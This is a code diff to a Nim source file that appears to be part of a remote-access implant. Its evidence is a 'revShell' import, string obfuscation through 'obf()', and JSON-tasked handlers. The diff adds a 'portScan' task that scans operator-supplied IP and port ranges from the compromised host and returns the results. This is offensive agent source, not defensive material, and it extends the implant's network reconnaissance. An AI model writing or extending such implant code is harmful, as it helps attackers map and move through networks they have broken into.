@@ -6,6 +6,7 @@ import threadpool
 import sleep
 import revShell
 import utils
+import portScanning
 
 const DATE_FORMAT: string = obf("yyyy-MM-dd'T'HH:mm:ss")
 
@@ -134,6 +135,33 @@ proc pid*(task: JsonNode): string =
         return $pid
     except Exception as e:
         return obf("Failed to get the PID: ") & e.msg
+
+proc portScan*(task: JsonNode): string =
+    var args: seq[JsonNode] = task[obf("args")].getElems
+    var ipsRange: string = args[0].getStr
+    var portsRange: string = args[1].getStr
+
+    var ips: seq[string] = expandIpRange(ipsRange)
+    var ports: seq[int] = expandPortRange(portsRange)
+
+    if ips.len == 0:
+        return obf("No IPs selected, scan aborted")
+
+    if ports.len == 0:
+        return obf("No ports selected, scann aborted")
+
+    var results: seq[PortScanResult]
+
+    try:
+        results = scanPorts(ips, ports)
+    except Exception as e:
+        return obf("An error occured while scanning the ports: ") & e.msg
+
+    var resultString: string = obf("Scan results:")
+    for scan in results:
+        resultString = resultString & "\n\t" & scan.ip & ":" & $scan.port & obf(" -> ") & scan.status
+
+    return resultString
 
 proc sleepThenQuit(): void =
     sleep(1000)
